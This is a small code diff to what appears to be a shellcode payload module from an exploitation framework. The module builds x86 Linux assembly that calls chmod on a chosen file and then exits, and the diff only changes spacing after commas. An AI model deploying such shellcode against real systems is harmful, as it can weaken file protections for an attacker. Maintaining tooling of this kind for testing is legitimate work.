@@ -15,18 +15,18 @@ class Module(base_module.BasePayload):
     file_dest = base_module.OptString("", "File Target")  # TODO improve descr
 
     def generate(self):
-        payload = "xor    %%eax,%%eax"
+        payload = "xor    %%eax, %%eax"
         payload += "push   %%eax"
         payload += stack.generate(self.file_dest, '%ebx', 'string')
-        payload += "mov    %%esp,%%edx"
+        payload += "mov    %%esp, %%edx"
         payload += stack.generate(self.perm, '%ecx', 'int')
         payload += "push   %%edx"
         payload += "push   $0xf"
         payload += "pop    %%eax"
         payload += "push   $0x2a"
         payload += "int    $0x80"
-        payload += "mov    $0x01,%%al"
-        payload += "mov    $0x01,%%bl"
+        payload += "mov    $0x01, %%al"
+        payload += "mov    $0x01, %%bl"
         payload += "int    $0x80"
 
         return payload
